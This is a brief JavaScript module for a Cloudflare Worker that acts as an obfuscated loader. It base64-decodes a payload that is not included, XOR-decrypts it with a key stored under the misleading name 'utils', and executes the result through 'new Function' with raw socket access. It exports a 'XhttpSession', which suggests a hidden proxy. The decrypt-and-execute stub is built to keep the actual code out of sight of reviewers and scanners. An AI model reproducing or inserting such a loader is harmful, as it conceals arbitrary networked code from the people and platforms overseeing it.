import { connect } from "cloudflare:sockets";
const CURRENT_VERSION = '__CURRENT_VERSION__';
const UPDATE_FIX = "";
/*__PAYLOAD_BLOCK__*/
const utils = new Uint8Array([22, 52, 5, 89, 102, 160, 34, 225, 124, 171, 221, 25, 173, 103, 93, 211]);
const score = Uint8Array.from(atob(payload), c => c.charCodeAt(0));
for (let i = 0; i < score.length; i++) { score[i] ^= utils[i % utils.length]; }
const view = new TextDecoder().decode(score);
const name = new Function("connect", view)(connect);
export default name;
export const XhttpSession = name.XhttpSession;
